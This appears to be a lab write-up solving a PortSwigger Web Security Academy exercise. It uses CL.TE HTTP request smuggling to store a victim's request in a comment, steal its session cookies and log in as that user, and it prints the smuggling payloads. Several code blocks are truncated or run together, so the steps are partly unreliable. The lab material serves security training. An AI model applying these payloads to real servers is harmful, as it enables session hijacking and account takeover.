# Exploiting HTTP request smuggling to capture other users' requests

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

Notes: 

- Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

- The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Hint: If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the Content-Length specified in the smuggled request prefix.

There is a function to send comments:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/3.png)


It generates a POST request:

"Front-end server doesn't support chunked encoding" means this page suffers a CL.TE type of HTTP request smuggling. Intercept a request to “/”, change the method to POST and the protocol to "HTTP/1":

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Host: 0aa10022031f57b8839bf075004000fc.web-security-academy.net
Content-Length: 3

a
```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/5.png)


Then substitute the request to "/my-account" for a request to "/post/comment":

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 928
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1

We can see our following request is written in the comments section:



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users'%20requests/6.png)


We increase the "Content-Length" value and see the victim's request is written, until the cookie appears:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 928
Transfer-Encoding: chunked

Finally, access /my-account with those cookies:

```
GET /my-account HTTP/2
Host: 0aa10022031f57b8839bf075004000fc.web-security-academy.net
